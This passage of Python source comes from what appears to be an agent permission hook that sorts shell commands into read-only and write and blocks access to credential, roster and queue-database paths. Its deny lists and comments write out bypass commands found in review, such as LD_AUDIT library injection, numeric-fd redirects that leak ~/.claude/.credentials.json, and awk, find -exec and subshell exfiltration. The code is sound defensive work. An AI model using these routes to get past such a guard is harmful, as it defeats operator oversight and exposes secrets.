            return False
        return True
    if leaf == "file":
        # Issue #1690 r3 (patch): `file -C` / `--compile` compiles a magic
        # database to `<magicfile>.mgc` — a FILE WRITE with no `>` token.
        # `-m`/`--magic-file`/`-M` only READ a magic file (no write), so
        # those stay allowed. Reject the compile flag (quote-stripped).
        return not any(
            _strip_token_quotes(t) in ("-C", "--compile") for t in args
        )
    return True


# Issue #1690 round 4 — `yq` write-surface filter. yq is on the read-
# intent set for `yq '.x' <file>` style queries, but it has write flags:
#   -i / --inplace        edit the source file in place (mutation)
#   -s / --split-exp EXPR  write output to one or more named files (exfil)
# Reject any of those (and their glued forms) so a yq mutation/exfil
# cannot ride the tasks.db read-intent carve-out. mikefarah-yq and
# kislyuk-yq differ in spelling; we reject the union, fail-closed.
# `--in-place` is the hyphenated spelling some yq builds accept alongside
# `--inplace` (issue #1690 r2 codex sweep); reject both.
_YQ_WRITE_FLAGS = ("-i", "--inplace", "--in-place", "-s", "--split-exp")


def _yq_is_read_only(stage_tokens: list[str]) -> bool:
    for tok in stage_tokens[1:]:
        t = _strip_token_quotes(tok)
        if t in _YQ_WRITE_FLAGS:
            return False
        # glued short `-i…` and `--split-exp=EXPR` / `--in-place=EXPR`.
        if t.startswith("-i") and not t.startswith("--"):
            return False
        if t.startswith("--split-exp=") or t.startswith("--in-place="):
            return False
    return True


# Issue #1690 round 4 — environment-prefix command-execution guard.
# `_stage_first_token` strips leading `VAR=value` assignments so e.g.
# `LC_ALL=C grep …` classifies as `grep`. But some env vars are
# COMMAND-EXECUTION / preprocessor hooks: setting them turns an otherwise
# read-only leader into an exec surface with NO shell `>` token. Codex
# re-review round 4 demonstrated `LESSOPEN='|cmd %s' less <db>` (and
# `PAGER=cmd`) exfil via the env prefix. Any read-intent stage that
# carries one of these assignments is treated as write-intent.
_DANGEROUS_ENV_PREFIXES = frozenset(
    {
        "LESSOPEN",
        "LESSCLOSE",
        "LESSPIPE",
        "PAGER",
        "GIT_PAGER",
        "MANPAGER",
        "BASH_ENV",
        "ENV",
        "SHELL",
        "IFS",
        # Dynamic-loader / preprocessor env vars are a CODE-EXEC surface:
        # the ld.so / dyld runtime linker loads and runs library code (or a
        # converter / profile / audit module) BEFORE main() on ANY dynamic
        # binary, including a plain read leader like `cat`, with no shell
        # `>` token and no setuid needed. `LD_AUDIT=/tmp/evil.so cat <db>`
        # runs evil.so's constructor via glibc rtld-audit = RCE (issue #1690
        # r3, patch). Treat the whole class as exec; add any future
        # ld.so/dyld loader var here.
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "LD_AUDIT",
        "LD_PROFILE",
        "LD_DEBUG_OUTPUT",
        "GCONV_PATH",
        "NLSPATH",
        "DYLD_INSERT_LIBRARIES",
        "DYLD_LIBRARY_PATH",
        "DYLD_FALLBACK_LIBRARY_PATH",
        "DYLD_FRAMEWORK_PATH",
        "DYLD_FALLBACK_FRAMEWORK_PATH",
        "PYTHONSTARTUP",
        "PERL5OPT",
        "GIT_EXTERNAL_DIFF",
        "GIT_SSH_COMMAND",
        "PROMPT_COMMAND",
        # vim/ex (`view` is on the read-intent set) read startup commands
        # from these env vars; they can run `:write!`/`:!cmd` (issue #1690
        # codex re-review round 6: `VIMINIT='…write! sink…' view <db>`).
        "VIMINIT",
        "EXINIT",
        # Option / config-file injection env vars for read-intent leaders.
        # These inject argv-equivalent options (or a config file that can
        # set an exec/output option) WITHOUT appearing on argv, so the
        # per-leader flag guards (`less -o`, `rg --pre`, …) never see them
        # (issue #1690 codex re-review round 7):
        #   LESS=-o/file              # inject less's -o log-file output
        #   RIPGREP_CONFIG_PATH=cfg   # rg config file can set --pre (RCE)
        #   GREP_OPTIONS=…            # inject grep options
        #   AWKPATH=… / AWKLIBPATH    # awk include / shared-lib search path
        #   MORE=…                    # inject more options
        "LESS",
        "MORE",
        "RIPGREP_CONFIG_PATH",
        "GREP_OPTIONS",
        "GREP_COLORS",
        "AWKPATH",
        "AWKLIBPATH",
    }
)


def _stage_has_dangerous_env_prefix(stage: str) -> bool:
    """True if a pipeline stage's leading `VAR=value` assignments include a
    command-execution / preprocessor env var (LESSOPEN, PAGER, LD_PRELOAD,
    …). These are stripped by `_stage_first_token` so the leader still
    looks read-only; setting them is an exec surface — fail-closed."""
    for token in stage.strip().split():
        if not token:
            continue
        if token == "env":
            continue
        # A `VAR=value` assignment prefix (same shape `_stage_first_token`
        # skips). Stop at the first non-assignment token — that is the
        # command leader and anything after it is argv, not an env prefix.
        if "=" in token and not token.startswith("-") and "/" not in token.split("=", 1)[0]:
            var = token.split("=", 1)[0]
            if var in _DANGEROUS_ENV_PREFIXES:
                return True
            continue
        break
    return False


def _is_read_intent_bash(command: str) -> bool:
    """Return True iff *command* is purely read-intent.

    Splits on shell command separators (``|``, ``||``, ``&&``, ``;``,
    newline) and requires every non-empty stage's leading command to be
    in :data:`_READ_INTENT_BASH_COMMANDS`. ``agent-bridge config get``
    (and the ``agb`` shorthand) is also recognised as read-intent.

    Conservative on purpose:

    - Any output redirection (``>``, ``>>``, ``&>``, ``2>``) appears as
      a token starting with that prefix and disqualifies the pipeline,
      even if the leading command is otherwise a read tool. ``cat >x``
      writes to *x* — the destination path could be the protected one.
      Stderr-suppression / fd-dup tokens in
      :data:`_SAFE_REDIRECT_PATTERNS` are exempt: they don't mutate the
      filesystem (issue #574).
    - Input redirection (``<``) is fine; it only opens the file for
      reading.
    - A single write-intent or unknown leading command anywhere in the
      pipeline disqualifies the whole thing. The bar is "this command
      provably does not mutate state".
    - Shell embeddings (``$(...)``, backticks, ``<(...)``, ``>(...)``,
      heredoc/here-string) make the command not read-intent: an embedded
      subshell runs an arbitrary command *before* the visible read tool,
      so ``cat <db> $(cp <db> sink)`` exfils despite the read leader
      (issue #1690 codex re-review round 6). Mirrors the peer-agent gate,
      which already refuses its carve-out on the same embeddings.
    """
    if not command.strip():
        return False
    # Issue #1690 round 6: refuse read-intent on a shell embedding the
    # shell would EXECUTE. A `$(...)` / backtick / process-substitution /
    # heredoc body runs an arbitrary command the per-stage leader check
    # never sees, so a visible read leader cannot vouch for the whole
    # command (`cat <db> $(cp <db> sink)`). Fail-closed. Use the QUOTE-
    # AWARE variant (issue #1690 r3) so a SINGLE-QUOTED `$(…)` the shell
    # passes literally — e.g. an awk computed field `awk '{print $(NF-1)}'`
    # — is not mis-denied; only unquoted/double-quoted expansions count.
    if _command_has_unquoted_shell_embedding(command):
        return False
    # Strip stderr-suppression / fd-dup tokens before splitting on shell
    # operators. `_COMMAND_OPERATOR_RE` would otherwise tear `2>&1` and
    # `&>/dev/null` on the embedded `&`, hiding them from the per-token
    # check below (issue #574). Matches must be token-boundary aware:
    # `2>/dev/null/extra` is a real write to a path under /dev/null/,
    # not a stderr discard, and must NOT be stripped (issue #574 r2).
    sanitized = _SAFE_REDIRECT_RE.sub(" ", command)
    # Split on shell operators with quote-awareness: a literal `|` / `;` /
    # `&` inside a quoted argument (e.g. the alternation in `grep -nE
    # 'format|codex' <path>`) must NOT start a new stage, or the read
    # would be misclassified as write-intent (issue #1054). A genuine
    # `... | tee <path>` still splits — the `tee` stage is unknown and
    # disqualifies the command, so the guard is not weakened.
    stages, balanced = _split_command_stages(sanitized)
    # Fail closed on an unterminated quote: an unbalanced quote masks
    # every operator after it, so a `... | tee <protected>` write would
    # hide behind the open quote. An un-parseable command is never a safe
    # read (issue #1054 codex r1).
    if not balanced:
        return False
    for stage in stages:
        stage_stripped = stage.strip()
        if not stage_stripped:
            continue
        # Issue #1690 round 4: a `VAR=value` prefix that sets a command-
        # execution / preprocessor env var (LESSOPEN, PAGER, LD_PRELOAD, …)
        # turns an otherwise read-only leader into an exec surface. The
        # leader check below never sees it because `_stage_first_token`
        # strips the assignment. Reject the whole pipeline (fail-closed).
        if _stage_has_dangerous_env_prefix(stage_stripped):
            return False
        # Reject output-redirection anywhere in the stage. Input redir
        # (`<file`) is fine; write redir (`>`, `>>`, `&>`, `2>`) is not.
        # Stderr-suppression forms (`2>/dev/null`, `2>&1`, `&>/dev/null`)
        # were stripped above and don't reach this loop (issue #574).
        for tok in stage_stripped.split():
            if tok in _SAFE_REDIRECT_PATTERNS:
                continue
            for prefix in ("&>", "2>", ">>", ">"):
                if tok.startswith(prefix):
                    return False
            # Numeric fd output redirections (`1>file`, `3>file`,
            # `99>>log`, …). The prefix tuple above only catches the
            # bare `>` / `>>` / `&>` / `2>` forms; other digit fds slip
            # through and would otherwise let
            # `cat ~/.claude/.credentials.json 1>/tmp/leak` classify as
            # read-intent (codex PR #881 r1 finding 1).
            if _NUMERIC_FD_WRITE_RE.match(tok):
                return False
        first = _stage_first_token(stage_stripped)
        if not first:
            continue
        # Strip any path component so `/usr/bin/cat` classifies as `cat`.
        leaf = first.rsplit("/", 1)[-1]
        # Issue #1014 C: a neutral prelude stage (`cd`, `test`, `echo`, …)
        # cannot mutate state — output redirection is already rejected by
        # the per-token check above — so it must not disqualify an
        # otherwise read-intent pipeline.
        if leaf in _NEUTRAL_PRELUDE_BASH_COMMANDS:
            continue
        if leaf in _READ_INTENT_BASH_COMMANDS:
            # Reject the in-place / write-mode flag forms even for tools
            # that are normally read-only (e.g. `sed -i`, `awk -i inplace`).
            stage_tokens = stage_stripped.split()
            if leaf == "sed" and not _sed_is_read_only(stage_tokens):
                return False
            if leaf == "awk" and "-i" in stage_tokens[1:]:
                return False
            # Issue #1690 rounds 2-4: `yq` has write surfaces beyond `-i`.
            # `-i` / `--inplace` edits the file IN PLACE (like `sed -i`);
            # `-s` / `--split-exp` writes output to one or more named files
            # (codex re-review round 4). Reject all of them so a `yq -i …`
            # mutation or `yq -s /tmp/leak …` exfil cannot ride the read-
            # intent carve-out (fail-closed; union across yq variants).
            if leaf == "yq" and not _yq_is_read_only(stage_tokens):
                return False
            # Issue #1690: awk has in-program write/exec/pipe primitives
            # (`print > "f"`, `print | "cmd"`, `system()`, `getline < cmd`)
            # that need no shell `>` token, so the per-token redirect check
            # above never sees them. Codex direction-review demonstrated
            # `awk '{print>"/tmp/leak"}' <db>` as a real tasks.db exfil that
            # rode the read-intent carve-out. Drop read-intent on any of
            # those program-body markers (fail-closed).
            if leaf == "awk" and not _awk_is_read_only(stage_tokens):
                return False
            # `find` is whitelisted for diagnostics (`find <roster>
            # -name "*.sh"`), but it has mutation/exec primitives
            # (`-delete`, `-exec`, `-execdir`, `-ok`, `-okdir`,
            # `-fprint`, `-fprint0`, `-fprintf`) that the leader check
            # alone does not see. Codex PR #1294 r2 demonstrated that
            # without this filter an admin could `find <roster>
            # -delete` or `find <roster> -exec python3
            # /tmp/mutator.py {} \;` through the roster carve-out.
            if leaf == "find" and not _find_is_read_only(stage_tokens):
                return False
            # Issue #1690 round 2: other read-intent leaders (sort -o,
            # less -o, view -c 'w!', rg --pre, xxd infile outfile, xxd -r)
            # carry their own named-file output / external-exec primitive
            # that needs no shell `>` token. Codex re-review found them
            # riding the tasks.db carve-out as exfil/RCE. Drop read-intent
            # on any such form (fail-closed); benign reads keep it.
            if not _named_read_leader_is_read_only(leaf, stage_tokens):
                return False
            continue
        # `agent-bridge config get …` / `agb config get …` are read-intent.
        if leaf in {"agent-bridge", "agb"}:
            stage_tokens = stage_stripped.split()
            try:
                cfg_idx = stage_tokens.index("config")
            except ValueError:
                return False
            if (
                len(stage_tokens) > cfg_idx + 1
                and stage_tokens[cfg_idx + 1] in {"get", "list-protected"}
            ):
                continue
            return False
        return False
    return True


# Issue #1255 r2 — admin roster carve-out is a strict whitelist.
#
# History: r1 shipped this as a write-intent *blacklist*
# (`_bash_command_has_no_write_intent`) that tolerated unknown stage
# leaders. Codex r1 review showed that posture lets an admin agent run
# `python3 /tmp/mutator.py <roster>`, `my-mutator <roster>`, or
# `git commit -F <roster>` — paths that bypass the
# `agent-bridge config set` wrapper's audit chain and can leak or
# rewrite roster secrets outside the sanctioned mutation surface.
#
# r2 flips the classifier to a whitelist: only the canonical read-only
# shapes already enumerated in :data:`_READ_INTENT_BASH_COMMANDS` are
# admitted, plus `agent-bridge config get` / `agb config get`. Unknown
# leaders default-deny, matching the credential / queue-DB / system-
# config gates. The whole point of #1255 unblocks operator diagnostics
# (`cat $roster`, `grep BRIDGE $roster`, `head -10 $roster`); none of
# those needed a blacklist — they're already on the read-intent
# whitelist.
#
# The function is a thin wrapper around :func:`_is_read_intent_bash`
# rather than a parallel implementation. That ties the admin carve-out
# to the same write-redirection / `sed -i` / unbalanced-quote /
# numeric-fd guards used everywhere else, so future hardening of the
# write-detection surface flows to the admin path automatically — no
# divergence to drift into the blacklist gap the r1 review caught.


def _bash_command_has_read_intent(command: str) -> bool:
    """Return True iff *command* is purely read-intent (whitelist).

    Issue #1255 r2 — the admin roster carve-out at
    :func:`protected_alias_reason` consults this function. A True
    return means "every pipeline stage's leading command is a known
    read-only tool (cat / grep / head / awk-no-`-i` / sed-no-`-i` /
    `agent-bridge config get` / …) and no stage opens an output
    redirection". False means the carve-out falls through to the
    non-admin deny — including unknown stage leaders like
    `python3 /tmp/mutator.py`, `my-mutator`, or `git commit -F`,
    which the r1 blacklist incorrectly tolerated.

    Delegating to :func:`_is_read_intent_bash` keeps the admin carve-
    out and the credential/queue-DB/system-config gates aligned on the
    same write-detection surface; we no longer maintain a parallel
    blacklist that can drift.
    """
    return _is_read_intent_bash(command)


def _is_read_intent_tool(tool_name: str, tool_input: dict[str, Any]) -> bool:
    """Return True iff a tool call is read-intent against any path.

    - Read / Glob / Grep / NotebookRead are read-intent.
    - Bash defers to :func:`_is_read_intent_bash`.
    - Edit / Write / MultiEdit / NotebookEdit and unknown tools are
      treated as write-intent (the safe default for novel surfaces).
    """
    if tool_name in {"Read", "Glob", "Grep", "NotebookRead"}:
        return True
    if tool_name == "Bash":
        return _is_read_intent_bash(str(tool_input.get("command") or ""))
    return False


# Issue #539: subpath allowlist that a class=system agent may read out of
# another agent's home. Only the operator-curated, ingestion-friendly
# memory subtrees are exposed; raw `state/`, `logs/`, `private/`,
# credentials, etc. stay denied even for system-class agents. Add a new
# subpath here ONLY when the bridge has a clear ingestion contract for
# it — every entry expands the cross-agent privilege surface.
_SYSTEM_CLASS_READABLE_AGENT_SUBPATHS: tuple[str, ...] = (
    "memory/projects/",
    "memory/decisions/",
    "memory/shared/",
)

# Issue #539: shared/* is broadly readable by class=system agents, with
# narrow exceptions for any operator-side curated secret/private prefix.
# Anything operators want to keep private even from system-class agents
# goes under one of these prefixes.
_SHARED_FORBIDDEN_PREFIXES: tuple[str, ...] = (
    "private/",
    "secrets/",
)


def _resolve_under(path: Path, root: Path) -> Path | None:
    """Return *path* expressed relative to *root*, or None if outside.

    Resolves both sides through ``Path.resolve()`` so symlinked aliases
    (e.g., the ``shared`` symlink under ``$BRIDGE_HOME/agents/``) and
    ``..`` traversal are normalized before the prefix check. Returning
    None signals "not under this root" to the caller — never an error.
    """
    try:
        rel = path.resolve().relative_to(root.resolve())
    except (ValueError, OSError):
        return None
    return rel


def _system_class_cross_agent_read_allowed(
    path: Path,
    self_agent: str,
) -> tuple[bool, str]:
    """Decide whether *path* is in the class=system Read allowlist.

    Returns ``(allowed, target_agent)``. ``target_agent`` is the peer
    whose home contains *path*, or ``""`` for shared/* matches; the
    caller uses it for the audit row. ``allowed=False`` means the path
    sits outside both the per-agent subpath allowlist and the shared
    allowlist, so the cross-agent gate must continue to deny — even for
    a system-class actor.

    The check is read-only by construction: the caller (the ``Read`` /
    ``Glob`` / ``Grep`` cross-agent gate) only invokes this for
    read-intent tools. Bash/Edit/Write paths never reach here, so a
    system-class agent cannot escalate to cross-agent writes through
    this carve-out.
    """
    bridge_home = bridge_home_dir()
    home_root = agent_home_root()

    # shared/* allowlist (with private/ and secrets/ explicitly excluded).
    shared_root = bridge_home / "shared"
    rel_shared = _resolve_under(path, shared_root)
    if rel_shared is not None:
        rel_str = rel_shared.as_posix()
        # Bare `shared/` (rel == ".") is allowed for directory-level reads.
        if rel_str == ".":
            return True, ""
        for forbidden in _SHARED_FORBIDDEN_PREFIXES:
            if rel_str == forbidden.rstrip("/") or rel_str.startswith(forbidden):
                return False, ""
        return True, ""

    # agents/<other>/memory/{projects,decisions,shared}/ allowlist.
    rel_agent = _resolve_under(path, home_root)
    if rel_agent is not None:
        parts = rel_agent.parts
        if len(parts) < 2:
            # `agents/` itself or `agents/<name>` — not enough structure
            # to be inside the memory allowlist.
            return False, ""
        other_agent = parts[0]
        # Self-home reads are allowed by the existing per-agent isolation;
        # this carve-out is specifically for *cross*-agent Read.
        if other_agent == self_agent:
            return False, ""
        rest = "/".join(parts[1:]) + "/"
        for sub in _SYSTEM_CLASS_READABLE_AGENT_SUBPATHS:
            if rest.startswith(sub):
                return True, other_agent
        return False, other_agent

    return False, ""


def protected_path_reason(
    path: Path,
    agent: str,
    *,
    read_intent: bool = False,
) -> str | None:
    admin = is_admin_agent(agent)
    # Order matters: keep the more-specific error messages (roster
    # secrets / queue DB) ahead of the generic system-config deny so
    # existing assertions in scripts/smoke-test.sh continue to find the
    # narrower wording. The system-config gate (issue #341) catches the
    # additional protected paths that don't map to a specific helper —
    # access.json, cron job files, hooks settings, runtime config.
    #
    # Admin agents do NOT bypass roster_local_path (codex r1 #341 CP2):
    # the file is in PROTECTED_GLOBS and the wrapper is the only sound
    # mutation surface even for admin. The wrapper itself runs from
    # operator-TUI, so legitimate operator workflows still succeed —
    # only direct Edit/Write attempts are blocked.
    #
    # Issue #383: read-intent calls (Read tool, cat/grep/etc., `agent-
    # bridge config get`) bypass the protected-path block-all branch.
    # #341's audit chain is about WRITES; reads do not mutate state and
    # should not be denied regardless of agent identity.
    if path == roster_local_path():
        if read_intent:
            return None
        if admin:
            return ROSTER_LOCAL_DENY_REASON
        return "shared roster secrets are not available inside Claude tool calls"
    # Issue #1690: the queue DB block is a WRITE contract — a read of the
    # DB file (Read tool / cat / ls / stat / file) does not mutate the
    # queue, so it must honor read_intent exactly like the roster /
    # system-config gates above and below. Writes (Edit / Write /
    # NotebookEdit and every other non-read-intent tool) still hit the
    # unconditional deny: the `agb` queue commands remain the only
    # sanctioned mutation surface. No admin bypass here — the carve-out is
    # read-intent for every agent, not an admin escalation (admin parity is
    # tracked separately in #1692). sqlite3 stays denied because it is not
    # on `_READ_INTENT_BASH_COMMANDS`, so a `sqlite3 db 'UPDATE …'` never
    # classifies as read-intent and never reaches this `return None`.
    if path == task_db_path():
        if read_intent:
            return None
        return "direct queue DB access is blocked; use `agb` queue commands instead"
    # Issue #341: remaining system-config paths must flow through the
    # wrapper for writes. Read-intent is allowed for all agents — the
    # wrapper layers an operator-source check on top of writes only.
    if is_protected_path(path):
        if read_intent:
            return None
        return SYSTEM_CONFIG_DENY_REASON
    # Issue #1711 (folded into #1806): the shared/private + shared/secrets
    # forbidden subtrees hold operator secrets and stay DENIED for EVERY
    # agent INCLUDING admin — harmonizing the non-Bash Read surface with the
    # Bash `protected_alias_reason` unconditional Stage-A deny. Previously the
    # `if admin: return None` early-return below let an admin Read
    # `shared/secrets/*` through the Read tool even though the same path was
    # denied via Bash `cat`. This deny is class-agnostic and intent-agnostic
    # (read or write): there is no sanctioned Read of these trees. It MUST run
    # BEFORE the `if admin: return None` early-return. System-config READ
    # stays allowed for all agents (handled above; only writes route through
    # the wrapper).
    rel_forbidden = _resolve_under(path, bridge_home_dir() / "shared")
    if rel_forbidden is not None:
        rel_forbidden_str = rel_forbidden.as_posix()
        if rel_forbidden_str != "." and any(
            rel_forbidden_str == forbidden.rstrip("/")
            or rel_forbidden_str.startswith(forbidden)
            for forbidden in _SHARED_FORBIDDEN_PREFIXES
        ):
            return (
                "cross-agent access is blocked: shared/private and "
                "shared/secrets are off-limits"
            )
    if admin:
        return None
    # Issue #539 r2: shared/* is NOT a peer-agent path, so
    # target_agent_for_path() returns None for it and the original
    # `if target:` block below never fired for shared reads. Evaluate
    # the system-class shared/* gate first, before peer-agent
    # resolution, so:
    #   - shared/private/*, shared/secrets/* → DENY for system class
    #     (operators may put credentials/secrets here that even
    #     ingestion agents must not see).
    #   - shared/<anything else> → ALLOW + audit for system class.
    # User class shared/* behavior is unchanged: target stays None,
    # the function returns None below, and the read passes without
    # audit (matches pre-#539 behavior — out of #539 scope).
    if read_intent and current_agent_class() == "system":
        rel_shared = _resolve_under(path, bridge_home_dir() / "shared")
        if rel_shared is not None:
            rel_str = rel_shared.as_posix()
            if rel_str != "." and any(
                rel_str == forbidden.rstrip("/") or rel_str.startswith(forbidden)
                for forbidden in _SHARED_FORBIDDEN_PREFIXES
            ):
                return (
                    "cross-agent access is blocked: shared/private and "
                    "shared/secrets are off-limits even for system-class agents"
                )
            emit_system_cross_agent_read(
                agent=agent,
                target_path=str(path),
                target_agent="",
                tool="Read",
            )
            return None
    target = target_agent_for_path(path, agent)
    if target:
        # Issue #539: class=system agents are allowed read-only access to
        # peer memory/{projects,decisions,shared}/ subtrees. The
        # carve-out fires only for read-intent tools (Read / Glob /
        # Grep / NotebookRead) — Bash/Edit/Write reach this branch with
        # read_intent=False and stay denied. Every allowed read emits a
        # `system_cross_agent_read` audit row so the operator retains a
        # full ledger of cross-agent access.
        if read_intent and current_agent_class() == "system":
            allowed, audit_target = _system_class_cross_agent_read_allowed(path, agent)
            if allowed:
                emit_system_cross_agent_read(
                    agent=agent,
                    target_path=str(path),
                    target_agent=audit_target or target,
                    tool="Read",
                )
                return None
        return f"cross-agent access is blocked: {target}"
    return None


# String-payload option flags: the next argv token (or the `=value` half of
# `--flag=value`) is a literal message body, not a filesystem path the command
# will open. These are the surfaces that fired #252 — a `--body` value that
# merely *mentions* the queue DB path should not be treated as an opener.
_STRING_PAYLOAD_FLAGS = frozenset(
    {
        "--body",
        "-m",
        "--message",
        "--title",
        "-t",
        "--description",
        "--notes",
        "--subject",
    }
)

# File-valued option flags: the next argv token (or `=value`) is the path of a
# file the command is going to read. Codex round-2 on PR #260 caught that
# treating these as skip-only unblocks `gh issue comment --body-file <db>` /
# `git commit -F <roster>`, which really do open the protected file. These
# values must flow through the same path check positional tokens get.
_FILE_VALUED_FLAGS = frozenset(
    {
        "--body-file",
        "-F",
        "--file",
        "--input",
    }
)

# Shell operators that separate commands. `shlex.split(…, posix=True)` does
# not treat `;` / `&&` / `||` / `|` / `&` / newlines as separators, so e.g.
# `sqlite3 /path/file&&echo ok` arrives as a single `/path/file&&echo` token.
# We split each token on these operators so a trailing operator doesn't hide
# a real path argv from the Path comparison below.
_COMMAND_OPERATOR_RE = re.compile(r"&&|\|\||\||;|&|\n")


def _split_command_stages(command: str) -> tuple[list[str], bool]:
    """Split *command* into shell stages, ignoring operators inside quotes.

    Returns ``(stages, balanced)``. ``balanced`` is ``False`` when the
    string ends while still inside an unterminated single or double
    quote — the command is not parseable as written.

    A bare :func:`_COMMAND_OPERATOR_RE.split` is not shell-quote aware: a
    literal operator character inside a single- or double-quoted argument
    — most commonly the ``|`` in an extended-regex alternation such as
    ``grep -nE 'format|codex' <path>`` — is torn into a spurious new
    stage, whose leading token (``codex'``) is unknown, so a read-only
    command is misclassified as write-intent (issue #1054).

    This walks the string once, tracking single/double quote state, and
    only honors an operator match that begins outside any quoted span.
    Quoting semantics match POSIX shells: a single quote is literal (a
    double quote inside it is not a quote), and vice versa; backslash
    escaping is not modelled because the operator regex never matches a
    backslash and an escaped quote inside the *other* quote style is
    already inert. Genuine pipelines / separators outside quotes still
    split exactly as before, so the guard is not weakened.

    An *unbalanced* quote masks every operator after it (the parser stays
    "inside" the quote to end-of-string), which would hide a real
    ``| tee <protected>`` write. The caller must fail closed on
    ``balanced=False`` — an un-parseable command is never a safe read
    (issue #1054 codex r1).
    """
    stages: list[str] = []
    start = 0
    quote: str | None = None
    i = 0
    n = len(command)
    while i < n:
        ch = command[i]
        if quote is not None:
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in ("'", '"'):
            quote = ch
            i += 1
            continue
        match = _COMMAND_OPERATOR_RE.match(command, i)
        if match:
            stages.append(command[start:i])
            start = match.end()
            i = match.end()
            continue
        i += 1
    stages.append(command[start:])
    return stages, quote is None


# Redirection prefixes that can ride with the path token (`<file`, `>out`,
# `2>err`, `&>log`, `>>append`). We peel the prefix before the expanduser /
# expandvars step so `<{abs task db}>` classifies as a read of the DB, not
# of the literal `<…` string.
_REDIRECTION_PREFIXES = ("&>", "2>", ">>", ">", "<")


def _alias_path_fragments(token: str):
    """Yield filesystem-like fragments hidden inside *token*.

    Splits on shell control operators (`;` / `&&` / `||` / `|` / `&` /
    newline) so a trailing operator does not hide the real path argv.
    Peels a single redirection prefix (`<` / `>` / `>>` / `2>` / `&>`)
    from each resulting fragment so Bash redirection syntax is comparable
    against the protected path.
    """
    for raw in _COMMAND_OPERATOR_RE.split(token):
        fragment = raw.strip()
        if not fragment:
            continue
        for prefix in _REDIRECTION_PREFIXES:
            if fragment.startswith(prefix):
                fragment = fragment[len(prefix):]
                break
        if fragment:
            yield fragment


# Length below which a substring-fallback needle is considered too generic
# to fire on its own — e.g. `hooks/` and `state/cron/` are short enough
# that any heredoc body documenting the hook chain or cron layout will
# trigger them. For such needles we require the character immediately
# preceding the match to be a path-boundary / token-boundary character
# so the match looks like an actual argv-shaped path (``>hooks/foo``,
# ``"hooks/post.sh"``, ``FOO=hooks/x``, ``$(hooks/y)``, ``cmd|hooks/z``,
# or start-of-string) and not prose like ``See hooks/post.sh for
# details`` that follows whitespace. Whitespace is **deliberately
# excluded** from the prefix set: heredoc bodies are the dominant
# source of false-positive shlex failures, and prose mentions inside
# them are always preceded by a space. Real argv writes always have a
# non-whitespace boundary character (redirection ``>``, assignment
# ``=``, quote, parenthesis, separator). Longer needles
# (``.discord/access.json``, ``agent-roster.local.sh``, etc.) are
# specific enough that a plain substring hit is acceptable. Issue #509
# D2 follow-up; tightened for r2 after codex flagged
# ``cat >hooks/foo 'unterminated`` bypassing the original three-char
# prefix set.
_SHORT_NEEDLE_THRESHOLD = 12
_PATH_PREFIX_CHARS = frozenset({
    "/",        # absolute / relative path
    "~",        # home expansion
    "$",        # var expansion
    ">",        # output redirection target (`>hooks/foo`, `&>hooks/foo`)
    "<",        # input redirection target
    "'",        # single-quoted token boundary
    '"',        # double-quoted token boundary
    "(",        # subshell / `$(...)` inner
    "=",        # assignment value (`FOO=hooks/...`)
    "&",        # background / fd redirect prefix (`&>hooks/...`)
    "|",        # pipe boundary
    ";",        # statement separator
    ",",        # comma separator in some shell idioms
})
# Issue #1693 — write/reference-position prefix chars for the SHORT-needle
# (`hooks/`, `state/cron/`) deny in the shlex-failure substring fallback.
# The full :data:`_PATH_PREFIX_CHARS` set above includes prose-punctuation
# characters (quote, paren, comma, pipe, semicolon) that routinely sit
# adjacent to a benign prose mention of a short suffix inside an
# unbalanced-quote command body — `echo it's 'hooks/x and don't`,
# `(hooks/post.sh)`, `a,hooks/z`. Those over-fired the system-config deny
# even though no write to the path is present (issue #1693; the broader
# class beyond the now-fixed verbatim repro). A REAL argv reference to a
# short suffix sits in a write/redirect/assignment/path-construction
# position — NOT after prose punctuation. The position test is done by
# :func:`_short_needle_at_write_position`, which scans backward over any
# opening quotes to the effective boundary char; these are the chars that
# mark such a position:
#   path construction — the needle is glued onto a path (`/etc/hooks/x`,
#     `~/hooks/x`, `$DIR/hooks/x`), an assignment value (`FOO=hooks/x`).
#   redirect operator  — `>` / `<` / `&` end an output / input / fd
#     redirect right before the target (`>hooks/x`, `>>hooks/x`,
#     `&>hooks/x`, `2>hooks/x`).
_SHORT_NEEDLE_BOUNDARY_CHARS = frozenset({"/", "~", "$", "=", ">", "<", "&"})
# Quote chars that may glue onto the FRONT of a redirect/assignment/path
# target (`>'hooks/x`, `="hooks/x`). Skipped during the backward scan so
# the effective boundary char behind them is what decides.
_SHORT_NEEDLE_QUOTE_CHARS = frozenset({"'", '"'})


def _short_needle_after_redirect_op(command: str, j: int) -> bool:
    """Return True iff *command[j]* is the LAST char of a Bash output/input/
    fd redirect operator that takes a file/word target:
      `>` `>>` `2>` `1>` `N>` `<` `<>` `&>` `&>>`  — end in `>`/`<`
      `>|`                                          — ends in `|` after `>`
      `>&` `<&`                                     — end in `&` after `>`/`<`
    Used to recognise a redirect TARGET separated from its operator by
    whitespace (issue #1693 codex r3 `cat > 'hooks/x'`; r4 `echo x >& y`)."""
    if j < 0:
        return False
    c = command[j]
    if c in (">", "<"):
        return True
    # noclobber override `>|` ends in `|`, which must be preceded by `>`.
    if c == "|" and j >= 1 and command[j - 1] == ">":
        return True
    # `>&word` / `<&word` redirect-to-target end in `&`, preceded by `>`/`<`
    # (the glued `>&hooks/x` form is already caught by the boundary set; this
    # covers the space-separated `>& hooks/x` form — issue #1693 codex r4).
    if c == "&" and j >= 1 and command[j - 1] in (">", "<"):
        return True
    return False


def _short_needle_at_write_position(command: str, idx: int) -> bool:
    """Return True iff the short needle at *command[idx:]* sits in a genuine
    write / redirect / assignment / path-construction position rather than
    after prose punctuation (issue #1693).

    Scans backward from the char before the needle, skipping any opening
    quote chars (so `>'hooks/x` and `="hooks/x` reduce to their effective
    boundary `>` / `=`). The needle is a real reference when:

      * start-of-string after skipping quotes (`'hooks/x` opening the
        command), or
      * the boundary char is in :data:`_SHORT_NEEDLE_BOUNDARY_CHARS`
        (path / assignment / redirect), or
      * the boundary char is `|` AND it is itself preceded by `>` — the
        Bash noclobber-override write `>|hooks/x` (codex #1693 r2). A bare
        pipe (`a|hooks/x`) is a stage boundary running a command, not a
        write to the path, and stays benign, or
      * the boundary is whitespace whose run is preceded by a redirect
        operator (`>`/`>>`/`>|`/`2>`/`<`/…) — a redirect target separated
        from its operator by a space (codex #1693 r3: `cat > 'hooks/x'`,
        `cat 2> hooks/x`).

    Everything else (prose whitespace, `(`, `,`, `;`, a bare `|`, an alnum
    word char) is a benign mention and returns False.
    """
